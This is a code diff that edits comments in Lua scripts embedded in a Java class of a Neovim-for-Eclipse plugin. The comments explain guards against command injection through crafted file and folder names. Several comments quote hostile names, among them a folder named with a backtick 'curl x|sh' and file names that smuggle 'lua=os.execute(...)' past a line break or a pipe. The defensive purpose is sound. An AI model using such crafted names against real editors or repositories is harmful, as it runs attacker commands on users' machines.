@@ -48,8 +48,7 @@ final class LuaScripts {
      *       echoes the first line of the problem {@code ]d} lands on.</li>
      *   <li>The command-line window ({@code q:}) is closed as soon as it opens, with a message:
      *       Eclipse cannot show a second window.</li>
-     *   <li>Two guards against files a cloned repository brings (file-by-file security review of
-     *       0.2.1), both kept when your config already decided:
+     *   <li>Two guards against files a cloned repository brings, both kept when your config already decided:
      *       <ul>
      *         <li>{@code g:rmd_dynamic_fenced_languages} is off. Neovim 0.12.6's R Markdown syntax
      *             file runs a backtick part of a crafted chunk header in a shell (Vim advisory
@@ -515,7 +514,7 @@ final class LuaScripts {
                 if args[1] == FINAL then
                   -- The usual way: eclipse_form wrote this line from the : line as typed, and
                   -- already made the file name the full path (file_words). Expanding the words
-                  -- again would be wrong, and was a 0.2.1 security bug: splitting the arguments
+                  -- again would be wrong, and dangerous: splitting the arguments
                   -- (fargs) turns a completed name's doubled backslash into one, so a backtick after
                   -- it was no longer escaped, and expandcmd() ran what followed in a shell (a cloned
                   -- repository's file named with a backslash and a backtick, completed into :x).
@@ -620,8 +619,8 @@ final class LuaScripts {
             -- { '++p', '/ws/app/out/a.txt' }, `:e +10 a.txt` { '+10', '/ws/app/a.txt' }.
             --
             -- A name with a line break is refused: Eclipse cannot show it, and the :Eclipse line
-            -- would end at it, running the rest of the name as a command (0.2.1 security review: a
-            -- cloned repository's file named notes, a line break, then lua=os.execute(...)).
+            -- would end at it, running the rest of the name as a command (a cloned repository's file
+            -- named notes, a line break, then lua=os.execute(...)).
             local function file_words(raw)
               local words, rest = {}, raw
               while rest:match('^%+%+') do -- ++opt words
@@ -720,7 +719,7 @@ final class LuaScripts {
                 -- nvim_parse_cmd took away the one before |, " and a line break, so it goes back.
                 -- :Eclipse takes a | after it (bar = true): without the backslash, a cloned
                 -- repository's file named x|lua(os.execute)(...) ran that Lua when its name was
-                -- completed into :e and Enter pressed (0.2.1 security review), and a " began a
+                -- completed into :e and Enter pressed, and a " began a
                 -- comment. :Eclipse gets the backslashed | and " back as | and ", as any command
                 -- marked -bar does. A line break would end the line there: refused, as for files.
                 local typed_args = {}
@@ -1126,7 +1125,7 @@ final class LuaScripts {
                 -- the :w that just opened another editor, say).
                 -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
                 -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
-                -- the moment one of its files opened (0.2.1 security review). chdir() takes the name
+                -- the moment one of its files opened. chdir() takes the name
                 -- as it is, and says nothing.
                 if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
                   pcall(vim.fn.chdir, folder, 'window')
@@ -1631,7 +1630,7 @@ final class LuaScripts {
               -- A line break in the name would split the :read below into two commands: fnameescape()
               -- puts a backslash before it but leaves it in, and vim.cmd() runs each line on its own,
               -- so a cloned repository's file named "x<newline>lua=os.execute(...)" ran that Lua when
-              -- Neovim loaded it (0.2.1 security review). Such a file is not read.
+              -- Neovim loaded it. Such a file is not read.
               if name:find('[\\r\\n]') then
                 vim.api.nvim_echo({ { 'Neovim for Eclipse does not read a file whose name has a line break: '
                   .. vim.inspect(name), 'ErrorMsg' } }, true, {})
